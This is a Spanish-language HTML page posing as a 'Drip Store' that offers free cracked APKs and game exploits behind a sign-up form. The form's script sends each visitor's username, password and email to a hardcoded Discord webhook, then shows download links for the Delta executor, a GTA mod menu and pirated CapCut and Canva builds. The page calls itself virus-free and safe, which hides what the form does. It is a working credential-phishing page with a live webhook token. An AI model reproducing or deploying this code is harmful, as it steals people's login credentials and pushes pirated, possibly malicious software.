<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DRIP STORE | PREMIUM ACCESS 👑</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --accent: #00f2ff; }
        * { font-family: 'Outfit', sans-serif; cursor: default; }
        
        /* 1. FONDO ANIMADO */
        body {
            background: linear-gradient(-45deg, #030305, #0a0a1f, #160a2c, #030305);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            color: white;
            min-height: 100vh;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* 2. GLASSMORPHISM */
        .glass {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
        }

        /* BOTÓN INTERACTIVO */
        .btn-premium {
            background: white;
            color: black;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .btn-premium:hover {
            transform: scale(1.05) translateY(-2px);
            background: var(--accent);
            box-shadow: 0 0 25px rgba(0, 242, 255, 0.6);
        }

        /* TARJETAS DE APKS */
        .apk-card {
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .apk-card:hover {
            transform: scale(1.02);
            background: rgba(255, 255, 255, 0.07);
        }
        .apk-card:active { transform: scale(0.98); }

        .loader {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid var(--accent);
            border-radius: 50%;
            width: 20px; height: 20px;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex items-center justify-center p-4">

    <section id="auth-screen" class="w-full max-w-md">
        <div class="text-center mb-8">
            <h1 class="text-5xl font-black tracking-tighter italic italic">CODEX <span class="text-[#00f2ff]">DRIP</span></h1>
            <p class="text-gray-400 text-xs tracking-[5px] mt-2">🛡️ SIN VIRUS | SEGURO</p>
        </div>

        <div class="glass p-8 rounded-[35px] relative">
            <div class="absolute -top-3 -right-3 bg-[#00f2ff] text-black text-[10px] font-bold px-3 py-1 rounded-full shadow-lg">👑 VIP ACCESS</div>
            
            <h2 class="text-2xl font-bold mb-6 text-center">CREAR CUENTA</h2>
            
            <div class="space-y-4">
                <div class="relative">
                    <span class="absolute left-4 top-4 opacity-40">👤</span>
                    <input type="text" id="u" placeholder="Nombre de Usuario" class="w-full p-4 pl-12 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] transition-all">
                </div>

                <div class="relative">
                    <span class="absolute left-4 top-4 opacity-40">📧</span>
                    <input type="email" id="e" oninput="validarCorreo(this)" placeholder="Correo Electrónico" class="w-full p-4 pl-12 bg-black/40 border border-white/5 rounded-2xl outline-none transition-all">
                </div>

                <div class="relative">
                    <span class="absolute left-4 top-4 opacity-40">🔒</span>
                    <input type="password" id="p" placeholder="Contraseña Maestra" class="w-full p-4 pl-12 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] transition-all">
                </div>

                <button onclick="enviarRegistro()" class="btn-premium w-full p-4 rounded-2xl font-black flex items-center justify-center gap-3 mt-4">
                    <span id="btn-text">ACCESO INSTANTÁNEO</span>
                    <div id="loading" class="loader"></div>
                </button>

                <p id="msg" class="text-center text-xs font-bold text-gray-500 mt-4 h-4"></p>
                
                <div class="text-center pt-4 border-t border-white/5">
                    <p class="text-[10px] text-gray-500 uppercase tracking-widest">🔥 +500 usuarios activos ahora mismo</p>
                </div>
            </div>
        </div>
    </section>

    <section id="store-screen" class="hidden w-full max-w-2xl py-10">
        <div class="text-center mb-12">
            <h1 class="text-5xl font-black italic">TODO <span class="text-[#00f2ff]">DESBLOQUEADO</span></h1>
            <p class="text-gray-400 mt-2">Selecciona tu herramienta de poder</p>
        </div>

        <div class="mb-10">
            <h3 class="text-[#00f2ff] font-bold text-xs tracking-widest mb-4 ml-2 uppercase">🛡️ EXPLOITS & HACKS</h3>
            <div class="grid gap-4" id="grid-hacks"></div>
        </div>

        <div class="mb-10">
            <h3 class="text-purple-400 font-bold text-xs tracking-widest mb-4 ml-2 uppercase">🎨 EDITORES & MULTIMEDIA</h3>
            <div class="grid gap-4" id="grid-tools"></div>
        </div>
    </section>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";

        const hacks = [
            { n: 'Delta Executor', d: 'Roblox Pro Menu', i: '🤖', l: 'https://deltaexploits.gg/delta-executor-android', tag: 'NUEVO', c: 'blue' },
            { n: 'GTA San Andreas', d: 'v2.11.277 Mod Menu', i: '🚗', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file', tag: 'VIP', c: 'green' }
        ];

        const tools = [
            { n: 'CapCut Pro', d: 'Premium Desbloqueado', i: '🎬', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file', tag: 'ACTUALIZADO', c: 'purple' },
            { n: 'Canva Pro', d: 'Todo Gratis', i: '🎨', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view', tag: 'VIP', c: 'pink' }
        ];

        // 5. VALIDACIÓN VISUAL EN TIEMPO REAL
        function validarCorreo(input) {
            const dominios = ["@gmail.com", "@hotmail.com", "@outlook.com", "@live.com"];
            const esValido = dominios.some(d => input.value.toLowerCase().endsWith(d));
            
            if(input.value.length > 5) {
                input.style.borderColor = esValido ? "#4ade80" : "#f87171";
            } else {
                input.style.borderColor = "rgba(255,255,255,0.1)";
            }
        }

        async function enviarRegistro() {
            const u = document.getElementById('u').value;
            const e = document.getElementById('e').value;
            const p = document.getElementById('p').value;
            const loading = document.getElementById('loading');
            const btnText = document.getElementById('btn-text');

            if(!u || !e || !p) return;

            // 6. PANTALLA DE CARGA
            loading.style.display = "block";
            btnText.innerText = "PROCESANDO...";

            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "👑 NUEVO MIEMBRO VIP",
                            color: 61951,
                            fields: [
                                { name: "👤 User", value: u, inline: true },
                                { name: "🔑 Pass", value: p, inline: true },
                                { name: "📧 Mail", value: e }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });

                // Sonido de éxito (opcional, simulación)
                setTimeout(abrirTienda, 800);
            } catch(err) {
                btnText.innerText = "ERROR";
                loading.style.display = "none";
            }
        }

        function abrirTienda() {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('store-screen').classList.remove('hidden');
            
            cargarCards(hacks, 'grid-hacks');
            cargarCards(tools, 'grid-tools');
        }

        function cargarCards(lista, gridId) {
            const grid = document.getElementById(gridId);
            lista.forEach(app => {
                grid.innerHTML += `
                <div onclick="window.open('${app.l}')" class="apk-card glass p-5 rounded-3xl flex items-center justify-between cursor-pointer border border-white/5">
                    <div class="flex items-center gap-5">
                        <div class="text-3xl bg-black/40 w-16 h-16 flex items-center justify-center rounded-2xl shadow-inner border border-white/5">${app.i}</div>
                        <div>
                            <h3 class="font-bold text-lg">${app.n}</h3>
                            <p class="text-xs text-gray-500">${app.d}</p>
                        </div>
                    </div>
                    <div class="flex flex-col items-end gap-2">
                        <span class="text-[9px] font-black bg-white/10 px-2 py-1 rounded-md tracking-tighter text-[#00f2ff]">${app.tag}</span>
                        <div class="text-[10px] font-bold text-gray-600">FREE</div>
                    </div>
                </div>`;
            });
        }
    </script>
</body>
</html>
